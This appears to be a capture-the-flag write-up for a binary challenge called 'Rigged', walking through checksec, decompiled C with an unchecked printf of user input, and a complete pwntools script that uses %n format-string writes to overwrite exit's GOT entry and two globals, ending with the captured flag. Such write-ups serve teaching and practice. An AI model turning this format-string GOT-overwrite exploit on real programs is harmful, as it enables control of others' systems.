+++
title = "Rigged"
date = 2024-07-02
authors = ["Abhinav I S"]
+++

first we run, checksec

```bash
checksec --file=challenge
```

<br>
{{ img(id="image1.png", alt="Alt Text", class="textCenter") }}

Looking at it in a decompiler (Ghidra)

```c

undefined8 main(void)

{
 long in_FS_OFFSET;
 char local_78 [104];
 long local_10;
 
 local_10 = *(long *)(in_FS_OFFSET + 0x28);
 banner();
 printf(
      "\nHelp Jim to fill these blanks up correctly please and submit your final sentence as the a nswer."
      );
 printf("\nNo matter what answer he provides, it somehow always seems to be wrong.");
 puts(
     "\nHe\'ll fail the test if he keeps getting this wrong! The evil school must have rigged the s ystem"
     );
 printf(
      "\nQ. In order to write efficent \'____\', developers usually go to a \'____\' to drink some  coffee: "
      );
 fflush(stdout);
 fgets(local_78,100,stdin);
 printf("Your final answer was ");
 printf(local_78);
 if ((blank1.1 == 0xc0de) && (blank2.0 == 0xcafe)) {
   printf(
        "\nOh! So you were able to somehow pass by the bearest of margins..Not bad. But its still  not good enough for me to care"
        );
                 /* WARNING: Subroutine does not return */
   exit(0);
 }
 printf(
      "\nYou failed again! Work Harder for the next test unless you wanna be a failure for the res t of your life"
      );
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                 /* WARNING: Subroutine does not return */
   __stack_chk_fail();
 }
 return 0;
}
```

We have to write 0xc0de in blank1.1, 0xcafe in blank2.0, and overwrite the GOT entry for exit to the function aced

we will use the printf %n format specifier vulnerability

1. first, we figure out which is the offset where the input we give is stored, using
the payload ABCD.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx...

<br>
{{ img(id="image2.png", alt="Alt Text", class="textCenter") }}

clearly, 8th arguement is the input we give (hex 414243)

2. Address of win function is at 0x401247
> all addresses remain same since PIE is off, we can get these from Ghidra or any decompiler
3. got address of EXIT is 0x404038

4. First we write 0x40 at got address of exit + 2 bytes 0x40 of the 0x401247, then we write 0x1247 (4679) but we have already printed 64 bytes, hence our payload will have 4615 extra bytes to print

5. Address of blank1.1 is 0x404050
6. Address of blank2 is 0x404054

7. we have to write 0xc0de (49374) at 0x404050, since we have printed 4679 bytes already, we need to print 49374 - 4679 = 44695 more bytes

8. Similarly we need to print 2592 more bytes and write it in the address of blank2 (cafe)

Now we can craft our payload 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rvcechalls.xyz", 32855)

    return r


def main():
    r = conn()

    #input is at %8$x
    # blank1 addr = 0x00404050 == 0xc0de
    # blank2 addr = 0x00404054 == 0xcafe

    gotEx = 0x0404038 #got address of exit

    r.recv()
    # got address of EXIT is 0x404038
    # win address is 00401247
    # i have to write 0x40 at win+2 bytes
    # i have to write 0x4038 at win

    payload = b""
    # total bytes in stack  = 9 + 12 + 12 + 11 = 44 : padding = 4A first one is 8th , so we have to start at 14
    payload += b"%64X%14$n" + b"%4615X%15$hn" + b"%44695X%16$n" + b"%2592X%17$nAAAA" + p64(gotEx+2) + p64(gotEx) + p64(0x00404050) + p64(0x404054)

    r.sendline(payload)
    print(hex(exe.got['exit']))
    r.recv()
    r.interactive()


if __name__ == "__main__":
    main()

```

<br>

gives us the flag
```
flag{W00Ww_J1M_Y0uVe_GOT_s0m3_c00l_sk1lzzz_1907f147578}
```
